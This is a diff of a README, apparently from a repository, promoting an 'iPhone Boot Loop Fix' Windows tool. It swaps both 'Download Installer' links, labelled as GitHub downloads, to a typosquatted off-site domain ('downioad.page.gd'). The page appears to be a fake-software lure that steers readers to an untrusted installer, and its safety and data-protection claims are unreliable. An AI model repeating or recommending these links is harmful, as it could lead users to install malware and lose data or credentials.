@@ -2,7 +2,7 @@
 
 iPhone Boot Loop Fix is a specialized Windows application designed to help users resolve iPhone boot loop and continuous restart issues. This tool offers a secure, non-destructive repair process that ensures your personal data remains intact while fixing the problem. Ideal for Windows 10 and 11 users, it provides a straightforward, guided experience from detection to resolution.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -63,7 +63,7 @@ No, since it does not alter hardware or violate Apple's terms, it should not aff
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Version Information
 
